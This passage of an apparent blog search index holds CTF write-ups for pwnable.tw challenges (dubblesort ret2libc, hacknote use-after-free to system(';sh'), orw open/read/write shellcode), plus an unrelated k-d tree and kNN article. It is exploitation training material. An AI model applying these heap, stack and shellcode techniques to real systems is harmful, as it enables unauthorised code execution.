overflow\uff0c\u56e0\u70ba\u5df2\u7d93\u8df3\u904e canary \u4e86\uff0c\u6240\u4ee5\u53ef\u4ee5\u4e00\u76f4\u63a8\u5230 return \u7684\u4f4d\u7f6e\uff0c\u4e26\u9032\u800c\u63a7\u5236 return address \u9019\u908a\u6211\u4e00\u6a23\u7528\u4e8c\u5206\u641c\u7684\u65b9\u5f0f\u4f86\u505a\uff0c\u5982\u679c\u6709\u84cb\u5230 return address \u7684\u4f4d\u7f6e\u7684\u8a71\u6703\u51fa\u73fe\u4ee5\u4e0b\u8a0a\u606f [ * ] Process './dubblesort' stopped with exit code -11 ( SIGSEGV ) ( pid 2290 ) \u641c\u5c0b\u904e\u5f8c\u77e5\u9053 return address \u662f\u5728\u7b2c 33 \u500b\u4f4d\u7f6e 24 ( payload ) + canary + 7 + ret \u6700\u5f8c\u5c31\u662f\u4f7f\u7528 libc base \u627e\u5230 system \u4ee5\u53ca /bin/sh \u4e32\u63a5\u5728 return address \u7684\u4f4d\u7f6e\u5373\u53ef","title":"ret2libc"},{"location":"Writeups/Others/pwnable.tw/dubblesort/#note","text":"","title":"Note"},{"location":"Writeups/Others/pwnable.tw/dubblesort/#pwntool-libc","text":"\u56e0\u70ba\u6709\u7d66 libc \uff0c\u6240\u4ee5\u5728\u672c\u6a5f\u6e2c\u8a66\u6642\u6700\u597d\u662f\u639b\u4e0a libc \uff0c\u5426\u5247\u4f4d\u5740\u53ef\u80fd\u6703\u8ddf\u9060\u7aef\u4e0d\u540c r = process ( './dubblesort' , env = { 'LD_PRELOAD' : './libc_32.so.6' })","title":"pwntool libc"},{"location":"Writeups/Others/pwnable.tw/dubblesort/#sort_1","text":"\u5728\u8f38\u5165 payload \u6642\uff0c\u56e0\u70ba\u8f38\u5165\u5b8c\u5f8c\u9084\u6703\u9032\u884c\u6392\u5e8f\uff0c\u6240\u4ee5\u8981\u78ba\u4fdd\u6392\u5e8f\u904e\u5f8c\u9806\u5e8f\u4f9d\u7136\u4e0d\u8b8a \u6211\u7684\u4f5c\u6cd5\u662f\u524d 24 \u500b\u5b57\u5c31\u76f4\u63a5\u8f38\u5165 0~23 \uff0ccanary \u7684\u90e8\u5206\u8f38\u5165 + (43)\uff0c\u63a5\u8457\u5f8c\u9762\u7684 7 \u500b\u5b57\u653e libc base\uff0c\u6700\u5f8c system \u53ca /bin/sh \u56e0\u70ba\u8981\u52a0\u4e0a libc base \uff0c\u6240\u4ee5\u4e00\u5b9a\u6bd4 libc base \u5927","title":"sort"},{"location":"Writeups/Others/pwnable.tw/dubblesort/#system","text":"\u5728\u547c\u53eb system \u6642\uff0cstack \u7b2c\u4e00\u500b\u4f4d\u7f6e\u662f\u7d50\u675f\u5f8c\u7684 return address\uff0c\u56e0\u70ba\u4e0d\u6703 return \u4e86\uff0c\u6240\u4ee5\u96a8\u4fbf\u586b\u5c31\u53ef\u4ee5\u4e86\uff0c\u63a5\u8457\u624d\u662f system \u7684\u7b2c\u4e00\u500b\u53c3\u6578 /bin/sh","title":"system"},{"location":"Writeups/Others/pwnable.tw/hacknote/","text":"hacknote Challenge Link: hacknote Category: pwn Writeup: hacknote A good Hacker should always take good notes! nc chall.pwnable.tw 10102 hacknote libc.so Observation This challenge is a Hacknote. There are 4 features (actually 3) - Add, Delete, and Print . ---------------------- HackNote ---------------------- 1. Add note 2. Delete note 3. Print note 4. Exit ---------------------- Your choice :1 Note size :20 Content :abcd Success ! ---------------------- HackNote ---------------------- 1. Add note 2. Delete note 3. Print note 4. Exit ---------------------- Your choice :3 Index :0 abcd ---------------------- HackNote ---------------------- 1. Add note 2. Delete note 3. Print note 4. Exit ---------------------- Your choice :2 Index :0 Success ---------------------- HackNote ---------------------- 1. Add note 2. Delete note 3. Print note 4. Exit ---------------------- Your choice :4 I wrote another challenge in csie.ctf.tw also called \"hacknote\" before, and both of these look similar. In hacknote (csie), this program malloc when add and free when delete. However, it didn't set the pointer to NULL . Therefore, we can use add to write something, and use print to run. What do I mean ? Let's try ! Experiment Add two notes I add two notes with size 32 and contents are \"aaaa\" and \"bbbb\". Here is the value on the heap. 0x804b000: 0x00000000 0x00000011 0x0804862b 0x0804b018 0x804b010: 0x00000000 0x00000029 0x61616161 0x0000000a <======= note \"aaaa\" 0x804b020: 0x00000000 0x00000000 0x00000000 0x00000000 ----------------------------- 0x804b030: 0x00000000 0x00000000 | 0x00000000 0x00000011 ------------------------------------- 0x804b040: 0x0804862b 0x0804b050 0x00000000 0x00000029 0x804b050: 0x62626262 0x0000000a 0x00000000 0x00000000 <======= note \"bbbb\" 0x804b060: 0x00000000 0x00000000 0x00000000 0x00000000 Let's focus on note \"aaaa\". ------------------------------------------------------ 0x804b000: | 0x00000000 0x00000011 0x0804862b 0x0804b018 | <======= struct note ---------------------------------------------|-------- | ------------- | ---------------------------------v-------------------- 0x804b010: | 0x00000000 0x00000029 0x61616161 0x0000000a | 0x804b020: | 0x00000000 0x00000000 0x00000000 0x00000000 | <======= content 0x804b030: | 0x00000000 0x00000000 | ------------------------------------------------------ The first 8 bytes of each blocks are headers of heap. struct note is 0x10 0x0804862b is print function 804862b: 55 push ebp 804862c: 89 e5 mov ebp,esp 804862e: 83 ec 08 sub esp,0x8 8048631: 8b 45 08 mov eax,DWORD PTR [ebp+0x8] 8048634: 8b 40 04 mov eax,DWORD PTR [eax+0x4] 8048637: 83 ec 0c sub esp,0xc 804863a: 50 push eax 804863b: e8 90 fe ff ff call 80484d0 <puts@plt> 8048640: 83 c4 10 add esp,0x10 8048643: 90 nop 8048644: c9 leave 8048645: c3 ret Delete I delete note \"aaaa\" (index 0) first, then I delete note \"bbbb\" (index 1). Here is the fastbin in heap. (0x10) fastbin[0]: 0x804b038 --> 0x804b000 --> 0x0 (0x18) fastbin[1]: 0x0 (0x20) fastbin[2]: 0x0 (0x28) fastbin[3]: 0x804b048 --> 0x804b010 --> 0x0 (0x30) fastbin[4]: 0x0 (0x38) fastbin[5]: 0x0 (0x40) fastbin[6]: 0x0 top: 0x804b070 (size : 0x20f90) last_remainder: 0x0 (size : 0x0) unsortbin: 0x0 Reallocate I add a new note with size 0x8 (0x8 + header = 0x10). Note 2 is allocated to 0x804b038, and it's content is 0x804b000 (original note 0). --------------------------------------------------------------- 0x804b000: | 0x00000000 0x00000011 0x61616161 0x0804b00a | <== content --------------------------------------------------------------- 0x804b010: 0x00000000 0x00000029 0x00000000 0x0000000a 0x804b020: 0x00000000 0x00000000 0x00000000 0x00000000 -------------------------------- 0x804b030: 0x00000000 0x00000000 | 0x00000000 0x00000011 | -------------------------------- | <== struct 0x804b040: | 0x0804862b 0x0804b008 | --------------------------------------------------------------- Solution Accroding to the experiment above, we can exploit it by reusing note. Leak libc First, we should leak the base of libc in order to using system(). I choose puts_got = 0x804a024 to leak. Because of the size of struct is 0x10, we can only use only 0x8 as content size (0x8 + header = 0x10). Thus, I put printNote function and puts_got in content to leak base. After adding note 2, note 0 is like this: struct note { printNote (); // 0x0804862b puts_got ; // 0x804a024 } When we print note 0, it will call printNote() then print puts_got. System() Before printing note, this program send address of note as parameter to function. ----------------- 0x804b000: 0x00000000 0x00000011 | 0x0804862b | 0x0804b018 ----------------- 0x804b010: 0x00000000 0x00000029 0x61616161 0x0000000a What if this function is system() ?? Value from 0x804b008 would be considered as string. Therefore, we can put something like ;sh in content. Because string before ; can not be executed, we have to add a ; to split it. After printing (system), a shell will prompt !!","title":"hacknote"},{"location":"Writeups/Others/pwnable.tw/hacknote/#hacknote","text":"Challenge Link: hacknote Category: pwn Writeup: hacknote A good Hacker should always take good notes! nc chall.pwnable.tw 10102 hacknote libc.so","title":"hacknote"},{"location":"Writeups/Others/pwnable.tw/hacknote/#observation","text":"This challenge is a Hacknote. There are 4 features (actually 3) - Add, Delete, and Print . ---------------------- HackNote ---------------------- 1. Add note 2. Delete note 3. Print note 4. Exit ---------------------- Your choice :1 Note size :20 Content :abcd Success ! ---------------------- HackNote ---------------------- 1. Add note 2. Delete note 3. Print note 4. Exit ---------------------- Your choice :3 Index :0 abcd ---------------------- HackNote ---------------------- 1. Add note 2. Delete note 3. Print note 4. Exit ---------------------- Your choice :2 Index :0 Success ---------------------- HackNote ---------------------- 1. Add note 2. Delete note 3. Print note 4. Exit ---------------------- Your choice :4 I wrote another challenge in csie.ctf.tw also called \"hacknote\" before, and both of these look similar. In hacknote (csie), this program malloc when add and free when delete. However, it didn't set the pointer to NULL . Therefore, we can use add to write something, and use print to run. What do I mean ? Let's try !","title":"Observation"},{"location":"Writeups/Others/pwnable.tw/hacknote/#experiment","text":"","title":"Experiment"},{"location":"Writeups/Others/pwnable.tw/hacknote/#add-two-notes","text":"I add two notes with size 32 and contents are \"aaaa\" and \"bbbb\". Here is the value on the heap. 0x804b000: 0x00000000 0x00000011 0x0804862b 0x0804b018 0x804b010: 0x00000000 0x00000029 0x61616161 0x0000000a <======= note \"aaaa\" 0x804b020: 0x00000000 0x00000000 0x00000000 0x00000000 ----------------------------- 0x804b030: 0x00000000 0x00000000 | 0x00000000 0x00000011 ------------------------------------- 0x804b040: 0x0804862b 0x0804b050 0x00000000 0x00000029 0x804b050: 0x62626262 0x0000000a 0x00000000 0x00000000 <======= note \"bbbb\" 0x804b060: 0x00000000 0x00000000 0x00000000 0x00000000 Let's focus on note \"aaaa\". ------------------------------------------------------ 0x804b000: | 0x00000000 0x00000011 0x0804862b 0x0804b018 | <======= struct note ---------------------------------------------|-------- | ------------- | ---------------------------------v-------------------- 0x804b010: | 0x00000000 0x00000029 0x61616161 0x0000000a | 0x804b020: | 0x00000000 0x00000000 0x00000000 0x00000000 | <======= content 0x804b030: | 0x00000000 0x00000000 | ------------------------------------------------------ The first 8 bytes of each blocks are headers of heap. struct note is 0x10 0x0804862b is print function 804862b: 55 push ebp 804862c: 89 e5 mov ebp,esp 804862e: 83 ec 08 sub esp,0x8 8048631: 8b 45 08 mov eax,DWORD PTR [ebp+0x8] 8048634: 8b 40 04 mov eax,DWORD PTR [eax+0x4] 8048637: 83 ec 0c sub esp,0xc 804863a: 50 push eax 804863b: e8 90 fe ff ff call 80484d0 <puts@plt> 8048640: 83 c4 10 add esp,0x10 8048643: 90 nop 8048644: c9 leave 8048645: c3 ret","title":"Add two notes"},{"location":"Writeups/Others/pwnable.tw/hacknote/#delete","text":"I delete note \"aaaa\" (index 0) first, then I delete note \"bbbb\" (index 1). Here is the fastbin in heap. (0x10) fastbin[0]: 0x804b038 --> 0x804b000 --> 0x0 (0x18) fastbin[1]: 0x0 (0x20) fastbin[2]: 0x0 (0x28) fastbin[3]: 0x804b048 --> 0x804b010 --> 0x0 (0x30) fastbin[4]: 0x0 (0x38) fastbin[5]: 0x0 (0x40) fastbin[6]: 0x0 top: 0x804b070 (size : 0x20f90) last_remainder: 0x0 (size : 0x0) unsortbin: 0x0","title":"Delete"},{"location":"Writeups/Others/pwnable.tw/hacknote/#reallocate","text":"I add a new note with size 0x8 (0x8 + header = 0x10). Note 2 is allocated to 0x804b038, and it's content is 0x804b000 (original note 0). --------------------------------------------------------------- 0x804b000: | 0x00000000 0x00000011 0x61616161 0x0804b00a | <== content --------------------------------------------------------------- 0x804b010: 0x00000000 0x00000029 0x00000000 0x0000000a 0x804b020: 0x00000000 0x00000000 0x00000000 0x00000000 -------------------------------- 0x804b030: 0x00000000 0x00000000 | 0x00000000 0x00000011 | -------------------------------- | <== struct 0x804b040: | 0x0804862b 0x0804b008 | ---------------------------------------------------------------","title":"Reallocate"},{"location":"Writeups/Others/pwnable.tw/hacknote/#solution","text":"Accroding to the experiment above, we can exploit it by reusing note.","title":"Solution"},{"location":"Writeups/Others/pwnable.tw/hacknote/#leak-libc","text":"First, we should leak the base of libc in order to using system(). I choose puts_got = 0x804a024 to leak. Because of the size of struct is 0x10, we can only use only 0x8 as content size (0x8 + header = 0x10). Thus, I put printNote function and puts_got in content to leak base. After adding note 2, note 0 is like this: struct note { printNote (); // 0x0804862b puts_got ; // 0x804a024 } When we print note 0, it will call printNote() then print puts_got.","title":"Leak libc"},{"location":"Writeups/Others/pwnable.tw/hacknote/#system","text":"Before printing note, this program send address of note as parameter to function. ----------------- 0x804b000: 0x00000000 0x00000011 | 0x0804862b | 0x0804b018 ----------------- 0x804b010: 0x00000000 0x00000029 0x61616161 0x0000000a What if this function is system() ?? Value from 0x804b008 would be considered as string. Therefore, we can put something like ;sh in content. Because string before ; can not be executed, we have to add a ; to split it. After printing (system), a shell will prompt !!","title":"System()"},{"location":"Writeups/Others/pwnable.tw/orw/","text":"orw Challenge link: orw Category: pwn Writeup: orw Read the flag from /home/orw/flag . Only open read write syscall are allowed to use. nc chall.pwnable.tw 10001 orw Observation \u9019\u984c\u984c\u610f\u5f88\u7c21\u55ae\uff0c\u5c31\u662f\u8f38\u5165 shellcode\uff0c\u5b83\u6703\u5e6b\u4f60\u57f7\u884c \u984c\u76ee\u6558\u8ff0\u4e2d\u6709\u8aaa\u53ea\u80fd\u4f7f\u7528 open read write \uff0c\u4e14 flag \u5728 /home/orw/flag \uff0c\u6240\u4ee5\u6b65\u9a5f\u5982\u4e0b open('/home/orw/flag') read to buffer write to stdout Try \u6211\u4e00\u958b\u59cb\u8a66\u8457\u4f7f\u7528 pwntool \u4e2d\u5167\u5efa\u7684 \u5de5\u5177 \uff0c\u4f46\u7121\u6cd5\u6210\u529f\u8b80\u51fa\u6a94\u6848 >>> print shellcraft . i386 . linux . cat ( '/home/orw/flag' ) /* push '/home/orw/flag \\x00 ' */ push 0x1010101 xor dword ptr [ esp ], 0x1016660 push 0x6c662f77 push 0x726f2f65 push 0x6d6f682f /* open ( file = 'esp' , oflag = 'O_RDONLY' , mode = 0 ) */ mov ebx , esp xor ecx , ecx xor edx , edx /* call open () */ push SYS_open /* 5 */ pop eax int 0x80 /* sendfile ( out_fd = 1 , in_fd = 'eax' , offset = 0 , count = 2147483647 ) */ push 1 pop ebx mov ecx , eax xor edx , edx push 0x7fffffff pop esi /* call sendfile () */ xor eax , eax mov al , 0xbb int 0x80 Solution \u6700\u5f8c\u6211\u9078\u64c7\u53c3\u8003 x86 syscall \u9010\u6b65\u69cb\u9020\u51fa open read write open(file='esp', oflag='O_RDONLY', mode=0) \u9019\u500b\u6211\u63a1\u7528 pwntool \u8f38\u51fa\u7684\u5beb\u6cd5 read(fd, buf, length) eax \u662f 0x3 fd \u5b58\u5728 open() \u7684\u56de\u50b3\u7d50\u679c ( eax ) buf \u9078\u5728 esp length \u662f 60 write(stdout, buf, length) eax \u662f 0x4 stdout \u662f 1 buf \u662f\u525b\u525b\u8b80\u53d6\u7684 esp length \u662f 60 /* push '/home/orw/flag\\x00' */ push 0x1010101 xor dword ptr [esp], 0x1016660 push 0x6c662f77 push 0x726f2f65 push 0x6d6f682f /* open(file='esp', oflag='O_RDONLY', mode=0) */ mov ebx, esp xor ecx, ecx xor edx, edx /* call open() */ push SYS_open /* 5 */ pop eax int 0x80 /*call read()*/ push eax push 0x3 pop eax pop ebx push 60 pop edx mov ecx, esp int 0x80 /*call write()*/ push 0x4 pop eax push 0x1 pop ebx push 60 pop edx mov ecx, esp int 0x80","title":"orw"},{"location":"Writeups/Others/pwnable.tw/orw/#orw","text":"Challenge link: orw Category: pwn Writeup: orw Read the flag from /home/orw/flag . Only open read write syscall are allowed to use. nc chall.pwnable.tw 10001 orw","title":"orw"},{"location":"Writeups/Others/pwnable.tw/orw/#observation","text":"\u9019\u984c\u984c\u610f\u5f88\u7c21\u55ae\uff0c\u5c31\u662f\u8f38\u5165 shellcode\uff0c\u5b83\u6703\u5e6b\u4f60\u57f7\u884c \u984c\u76ee\u6558\u8ff0\u4e2d\u6709\u8aaa\u53ea\u80fd\u4f7f\u7528 open read write \uff0c\u4e14 flag \u5728 /home/orw/flag \uff0c\u6240\u4ee5\u6b65\u9a5f\u5982\u4e0b open('/home/orw/flag') read to buffer write to stdout","title":"Observation"},{"location":"Writeups/Others/pwnable.tw/orw/#try","text":"\u6211\u4e00\u958b\u59cb\u8a66\u8457\u4f7f\u7528 pwntool \u4e2d\u5167\u5efa\u7684 \u5de5\u5177 \uff0c\u4f46\u7121\u6cd5\u6210\u529f\u8b80\u51fa\u6a94\u6848 >>> print shellcraft . i386 . linux . cat ( '/home/orw/flag' ) /* push '/home/orw/flag \\x00 ' */ push 0x1010101 xor dword ptr [ esp ], 0x1016660 push 0x6c662f77 push 0x726f2f65 push 0x6d6f682f /* open ( file = 'esp' , oflag = 'O_RDONLY' , mode = 0 ) */ mov ebx , esp xor ecx , ecx xor edx , edx /* call open () */ push SYS_open /* 5 */ pop eax int 0x80 /* sendfile ( out_fd = 1 , in_fd = 'eax' , offset = 0 , count = 2147483647 ) */ push 1 pop ebx mov ecx , eax xor edx , edx push 0x7fffffff pop esi /* call sendfile () */ xor eax , eax mov al , 0xbb int 0x80","title":"Try"},{"location":"Writeups/Others/pwnable.tw/orw/#solution","text":"\u6700\u5f8c\u6211\u9078\u64c7\u53c3\u8003 x86 syscall \u9010\u6b65\u69cb\u9020\u51fa open read write open(file='esp', oflag='O_RDONLY', mode=0) \u9019\u500b\u6211\u63a1\u7528 pwntool \u8f38\u51fa\u7684\u5beb\u6cd5 read(fd, buf, length) eax \u662f 0x3 fd \u5b58\u5728 open() \u7684\u56de\u50b3\u7d50\u679c ( eax ) buf \u9078\u5728 esp length \u662f 60 write(stdout, buf, length) eax \u662f 0x4 stdout \u662f 1 buf \u662f\u525b\u525b\u8b80\u53d6\u7684 esp length \u662f 60 /* push '/home/orw/flag\\x00' */ push 0x1010101 xor dword ptr [esp], 0x1016660 push 0x6c662f77 push 0x726f2f65 push 0x6d6f682f /* open(file='esp', oflag='O_RDONLY', mode=0) */ mov ebx, esp xor ecx, ecx xor edx, edx /* call open() */ push SYS_open /* 5 */ pop eax int 0x80 /*call read()*/ push eax push 0x3 pop eax pop ebx push 60 pop edx mov ecx, esp int 0x80 /*call write()*/ push 0x4 pop eax push 0x1 pop ebx push 60 pop edx mov ecx, esp int 0x80","title":"Solution"},{"location":"algorithm/kdtree/","text":"k-d tree \u4e4b\u524d\u5728\u505a Golearn \u6642\uff0c\u70ba\u4e86\u52a0\u901f knn \u7684\u641c\u5c0b\u901f\u5ea6\uff0c\u56e0\u6b64\u5be6\u505a\u4e86 k-d tree\uff0c\u7576\u6642\u627e\u4e86\u5f88\u4e45\uff0c\u7e3d\u662f\u627e\u4e0d\u5230\u4e00\u7bc7\u5b8c\u6574\u7684\u6587\u7ae0\u8b1b\u89e3 \u5982\u4f55 \u5c07 kdtree \u61c9\u7528\u5728 knn \u4e2d \uff0c\u56e0\u6b64\u6c7a\u5b9a\u5beb\u9019\u7bc7\u4f86\u7d00\u9304\u4e0b\u6211\u7684\u4f5c\u6cd5\u3002 \u4ec0\u9ebc\u662f k-d tree ? k-d tree \u662f k-dimensional tree \u7684\u7e2e\u5beb\uff0c\u4e5f\u5c31\u662f k \u7dad\u6a39\uff0c\u7c21\u55ae\u4f86\u8aaa\uff0c\u5c31\u662f\u6a39\u7684\u6bcf\u4e00\u5c64\u90fd\u662f\u4ee5 \u4e0d\u540c\u7684\u7dad\u5ea6\u6a19\u6e96 \u505a\u5206\u5272\uff0c\u800c\u4e0d\u662f\u55ae\u7d14\u7528\u67d0\u500b\u7dad\u5ea6\u4f86\u5efa\u6a39\u3002 \u55ae\u7dad\u5ea6\u7684\u6a39 \u901a\u5e38\u770b\u5230\u7684\u6a39\uff0c\u90fd\u662f\u53ea\u7528\u5176\u4e2d\u4e00\u500b\u7dad\u5ea6\u7684\u8cc7\u6599\u4f86\u5efa\u6a39\uff0c\u8209\u4f8b\u4f86\u8aaa\uff1a \u6709\u516d\u7b46\u8cc7\u6599\u5982\u4e0b\uff0c\u6bcf\u7b46\u8cc7\u6599\u90fd\u53ea\u6709\u4e00\u500b\u7dad\u5ea6 [1, 3, 5, 41, 67, 87] \u76f4\u63a5\u5efa\u6a39\u7684\u8a71\uff0c\u53ef\u80fd\u6703\u51fa\u73fe\u50cf\u9019\u6a23\u7684\u6a39 \u591a\u7dad\u5ea6\u7684\u6a39(k-d tree) \u901a\u5e38\u7528\u5728\u6a5f\u5668\u5b78\u7fd2\u7684\u8cc7\u6599\u4e0d\u6703\u53ea\u6709\u4e00\u500b\u7dad\u5ea6\uff0c\u8209\u4f8b\u4f86\u8aaa\uff1a \u4e00\u6a23\u6709\u516d\u7b46\u8cc7\u6599\uff0c\u6bcf\u7b46\u8cc7\u6599\u90fd\u662f\u4e8c\u7dad\u7684 [[2, 4], [3, 7], [6, 5], [1, 6], [8, 4], [5, 3]] \u5982\u679c\u6bcf\u500b\u7dad\u5ea6\u7684\u8cc7\u6599\u90fd\u4e00\u6a23\u91cd\u8981\u7684\u8a71\uff0c\u5efa\u6a39\u6642\u5c31\u5fc5\u9808\u8003\u616e\u6240\u6709\u7684\u7dad\u5ea6\uff0c\u56e0\u6b64\u5728\u5efa k-d tree \u6642\uff0c\u5c31\u6703 \u8f2a\u6d41\u7528\u4e0d\u540c\u7684\u7dad\u5ea6 \u4f5c\u70ba\u5207\u5272\u7684\u6a19\u6e96 k-d tree \u5206\u6790 \u5c07\u4e0a\u9762\u7684\u8cc7\u6599\u756b\u5230\u4e8c\u7dad\u5ea7\u6a19\u5716\u4e0a\u4f86\u5206\u6790 \u5176\u4e2d\u7d05\u8272\u7684\u9ede\u662f\u4e0a\u9762\u7d66\u7684\u8cc7\u6599\uff0c\u6dfa\u85cd\u8272\u7684\u7dda\u662f\u7b2c\u4e00\u500b\u5206\u754c\uff0c\u7d2b\u8272\u7684\u7dda\u662f\u7b2c\u4e8c\u500b\u5206\u754c \u85c9\u7531 x \u65b9\u5411\u4ee5\u53ca y \u65b9\u5411\u7684\u7dda\uff0c\u5c07\u6240\u6709\u7684\u9ede\u90fd\u5340\u5206\u958b\u4f86 \u5982\u679c\u73fe\u5728\u6709\u4e00\u500b\u65b0\u7684\u9ede\uff0c\u6211\u60f3\u8981\u77e5\u9053 \u5b83\u8ddf\u8ab0\u6700\u8fd1 \u7684\u8a71\uff0c\u5c31\u53ef\u4ee5\u5229\u7528 k-d tree \u5feb\u901f\u627e\u5230\u5c6c\u65bc\u90a3\u500b\u9ede\u7684\u5340\u57df \u5efa\u69cb k-d tree \u5efa\u6a39 \u5efa\u6a39\u8981\u8003\u616e\u5169\u500b\u90e8\u4efd\uff0c\u5206\u5225\u662f \u8981\u7528\u54ea\u500b\u7dad\u5ea6\u5206\u5272 \u4ee5\u53ca \u8981\u9078\u54ea\u500b\u9ede\u7576\u5206\u5272\u7bc0\u9ede \u7dad\u5ea6\u7684\u90e8\u4efd\uff0c\u6211\u662f\u76f4\u63a5\u7167\u8457\u9806\u5e8f\u5f9e\u7b2c\u4e00\u500b\u958b\u59cb\u6bcf\u5c64\u5c31\u63db\u6210\u4e0b\u4e00\u500b\uff0c\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0c\u5176\u5be6 \u4e0d\u4e00\u5b9a \u8981\u7167\u9806\u5e8f\u4f86\uff0c\u5012\u8457\u505a\u6216\u662f\u96a8\u6a5f\u9078\u4e00\u500b\u90fd\u662f\u53ef\u4ee5\u7684 \u9078\u64c7\u7bc0\u9ede\u7684\u90e8\u4efd\uff0c\u6211\u662f\u5c07\u7576\u524d\u5340\u584a\u7684\u6240\u6709\u9ede\u4f9d\u7167\u9078\u5b9a\u7dad\u5ea6\u7684\u503c\uff0c\u7531\u5c0f\u5230\u5927\u6392\u5217\uff0c\u63a5\u8457\u9078\u53d6 \u4e2d\u9593\u9ede \u4f5c\u70ba\u5206\u5272\u7bc0\u9ede \u5176\u9918\u7684\u82e5\u9078\u5b9a\u7dad\u5ea6\u7684\u503c\u5c0f\u65bc\u7b49\u65bc\u5206\u5272\u7bc0\u9ede\uff0c\u5247\u653e\u5165\u5de6\u5b50\u6a39 \u82e5\u5927\u65bc\u5206\u5272\u7bc0\u9ede\uff0c\u5247\u653e\u5165\u53f3\u5b50\u6a39 \u6211\u5728\u67e5 k-d tree \u76f8\u95dc\u7684\u8cc7\u6599\u6642\uff0c\u6709\u4e00\u4e9b\u8cc7\u6599\u8aaa\u8981\u628a\u6240\u6709\u7684\u9ede\u90fd\u4e0b\u653e\u5230\u8449\u7bc0\u9ede\u4e0a\uff0c\u4f46\u6211\u641e\u4e0d\u61c2\u9019\u6a23\u5982\u4f55\u5be6\u505a\uff0c\u56e0\u6b64\u9078\u64c7\u628a\u5206\u5272\u7bc0\u9ede\u639b\u5728\u4e0a\u9762\u7684\u4f5c\u6cd5 \u5c0b\u627e\u6700\u8fd1\u9ede \u5982\u679c\u73fe\u5728\u6709\u4e00\u500b\u65b0\u7684\u9ede\uff0c\u6211\u60f3\u8981\u77e5\u9053\u96e2\u5b83\u6700\u8fd1\u7684\u9ede\u6642\uff0c\u4e26\u4e0d\u662f\u76f4\u63a5\u5f80\u4e0b\u770b\u5230\u54ea\u500b\u9ede\u505c\u4e0b\u4f86\u5c31\u662f\u6700\u8fd1\u7684\uff0c\u800c\u662f\u8981 \u4e00\u5c64\u4e00\u5c64\u5c0b\u627e \uff0c\u96d6\u8aaa\u662f\u4e00\u5c64\u4e00\u5c64\u627e\uff0c\u4f46\u4e26\u4e0d\u6703\u641c\u5c0b\u6240\u6709\u7684\u9ede \u5177\u9ad4\u64cd\u4f5c\u5982\u4e0b\uff1a \u5f80\u4e0b\u6bd4\u8f03\u76f4\u5230\u627e\u5230\u6700\u5e95\u5c64\u7684\u7bc0\u9ede \u8a08\u7b97\u51fa\u7576\u524d\u9ede\u7684\u8ddd\u96e2 \u82e5\u7576\u524d\u9ede\u8ddd\u96e2\u5c0f\u65bc\u6700\u5c0f\u8ddd\u96e2\uff0c\u5247\u66f4\u65b0\u6700\u5c0f\u8ddd\u96e2\uff0c\u4e26\u641c\u5c0b\u8a72\u7bc0\u9ede\u53e6\u4e00\u5b50\u7bc0\u9ede\u4e0b\u6240\u6709\u7bc0\u9ede \u79fb\u52d5\u5230\u7236\u7bc0\u9ede \u91cd\u8907\u57f7\u884c 2, 3, 4 \u6b65\u76f4\u5230\u5230\u9054\u6839\u7bc0\u9ede knn \u4f7f\u7528 k-d tree \u6240\u8b02\u7684 knn \u6307\u7684\u662f k nearest neighbors\uff0c\u9867\u540d\u601d\u7fa9\uff0cknn \u5c31\u662f\u8981\u5728\u4e00\u5806\u8cc7\u6599\u4e2d\u627e\u51fa\u96e2\u67d0\u8cc7\u6599\u6700\u8fd1\u7684 k \u7b46 \u6700\u7c21\u55ae\u4e5f\u6700\u8017\u6642\u7684\u4f5c\u6cd5\u5c31\u662f\u5168\u90e8\u90fd\u8a08\u7b97\u51fa\u8ddd\u96e2\u5f8c\uff0c\u518d\u6392\u5217\u5f8c\u62ff\u51fa\u6700\u8fd1\u7684 k \u500b\uff0c\u9019\u500b\u4f5c\u6cd5\u7a31\u4f5c linear \u5be6\u969b\u4e0a\uff0c\u4e5f\u53ef\u4ee5\u5229\u7528 k-d tree \u4ee5\u5728\u4e0d\u7528\u6aa2\u67e5\u6240\u6709\u8cc7\u6599\u7684\u60c5\u6cc1\u4e0b\uff0c\u5feb\u901f\u627e\u51fa\u6700\u8fd1\u7684k\u7b46\u8cc7\u6599\uff0c\u4f46\u554f\u984c\u662f\u4e0a\u8ff0\u7684 k-d tree \u53ea\u80fd\u627e\u5230\u6700\u8fd1\u7684\u4e00\u500b\u9ede\uff0c\u56e0\u6b64\u9700\u8981\u505a\u4e00\u9ede\u4fee\u6539 heap \u5728\u6211\u7684\u4f5c\u6cd5\u4e2d\u6703\u4f7f\u7528\u5230 max-heap \uff0c\u6240\u8b02\u7684 max-heap \u5c31\u662f\u6703\u5c07\u4e1f\u5165\u7684\u8cc7\u6599\u5b58\u4e0b\u4f86\uff0c\u7136\u5f8c\u53ef\u4ee5\u8f38\u51fa\u5176\u4e2d\u6700\u5927\u503c\u7684\u4e00\u7a2e\u8cc7\u6599\u7d50\u69cb \u524d k \u500b\u6700\u5c0f\u503c\u641c\u5c0b \u6211\u7684\u4f5c\u6cd5\u662f\u4f7f\u7528\u4e00\u500b\u5bb9\u91cf\u70ba k \u7684 heap\uff0c\u5728\u641c\u5c0b\u7684\u904e\u7a0b\u4e2d \u5982\u679c heap \u9084\u672a\u6eff\uff0c\u5247\u52a0\u5165\u7576\u524d\u7684\u7bc0\u9ede\uff0c\u4e14\u641c\u5c0b\u7576\u524d\u7bc0\u9ede\u7684\u53e6\u4e00\u500b\u5b50\u6a39 \u5982\u679c heap \u5df2\u6eff\uff0c\u5247\u5229\u7528 heap \u4e2d\u7684\u7576\u524d\u6700\u5927\u503c\u4f86\u57f7\u884c\u539f\u672c\u7684\u641c\u5c0b\uff0c\u4e26\u96a8\u6642\u66f4\u65b0 heap \u4e2d\u7684\u503c \u5177\u9ad4\u64cd\u4f5c\u5982\u4e0b\uff1a \u5f80\u4e0b\u6bd4\u8f03\u76f4\u5230\u627e\u5230\u6700\u5e95\u5c64\u7684\u7bc0\u9ede \u8a08\u7b97\u51fa\u7576\u524d\u9ede\u7684\u8ddd\u96e2 \u82e5heap\u672a\u6eff\uff0c\u5247\u52a0\u5165\u7576\u524d\u7bc0\u9ede\uff0c\u4e14\u641c\u5c0b\u8a72\u7bc0\u9ede\u53e6\u4e00\u5b50\u7bc0\u9ede\u4e0b\u6240\u6709\u7bc0\u9ede \u82e5heap\u5df2\u6eff\uff0c\u4e14\u7576\u524d\u9ede\u8ddd\u96e2\u5c0f\u65bcheap\u4e2d\u6700\u5927\u8ddd\u96e2\uff0c\u5247\u66f4\u65b0heap\uff0c\u4e26\u641c\u5c0b\u8a72\u7bc0\u9ede\u53e6\u4e00\u5b50\u7bc0\u9ede\u4e0b\u6240\u6709\u7bc0\u9ede 